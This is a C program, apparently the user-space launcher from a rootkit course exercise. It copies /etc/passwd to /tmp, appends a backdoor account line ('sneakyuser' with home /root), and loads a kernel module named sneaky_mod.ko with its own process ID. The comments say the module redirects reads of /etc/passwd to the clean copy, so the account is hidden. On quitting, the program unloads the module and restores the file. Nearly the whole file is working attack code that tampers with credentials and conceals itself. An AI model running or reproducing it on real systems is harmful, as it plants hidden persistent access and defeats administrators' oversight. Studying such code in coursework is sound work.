#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>

#define TEMP_PASSWD_FILE "/tmp/passwd"

// here write a function to copy the source file to the destination path
void copy_file(const char *src, const char *dest) {
    int src_fd;
    int dest_fd;
    ssize_t n_read;
    ssize_t n_written;
    char buffer[1024];
    
    // check if it can open the source file
    src_fd = open(src, O_RDONLY);
    if (src_fd < 0) {
        perror("Failed to open source file");
        exit(EXIT_FAILURE);
    }
    
    // check if it can open the dest file
    dest_fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (dest_fd < 0) {
        perror("Failed to open destination file");
        // remember to close the source file
        close(src_fd);
        exit(EXIT_FAILURE);
    }
    
    // rewrite the dest with the source
    while ((n_read = read(src_fd, buffer, sizeof(buffer))) > 0) {
        n_written = write(dest_fd, buffer, n_read);
        if (n_written != n_read) {
            perror("Failed to write to destination file");
            close(src_fd);
            close(dest_fd);
            exit(EXIT_FAILURE);
        }
    }
    
    close(src_fd);
    close(dest_fd);
}

// here write a function to add one more line to the original file
void append_to_file(const char *filename, const char *content) {
    int fd = open(filename, O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("Failed to open file for appending");
        exit(EXIT_FAILURE);
    }
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        perror("Failed to append to file");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
}

int main() {
    printf("sneaky_process pid = %d\n", getpid());

    // copy the orginial /etc/passwd to the temp pwd file to save the original file
    // the openat in sneaky_mod will redirect to the temp pwd file(original) if the user want to check the pwd file
    copy_file("/etc/passwd", TEMP_PASSWD_FILE);
    
    // add one more line of sneaky user
    const char *sneaky_user = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
    append_to_file("/etc/passwd", sneaky_user);
    
    char cmd[256];
    sprintf(cmd, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
    system(cmd);
    
    // wait for the q to quit
    char c;
    while ((c = getchar()) != 'q') {
    }
    
    system("rmmod sneaky_mod.ko");
    
    // copy the orginial pwd to the original pwd file to recover
    copy_file(TEMP_PASSWD_FILE, "/etc/passwd");
    // delete the temp file
    system("rm " TEMP_PASSWD_FILE);
    
    return EXIT_SUCCESS;
}
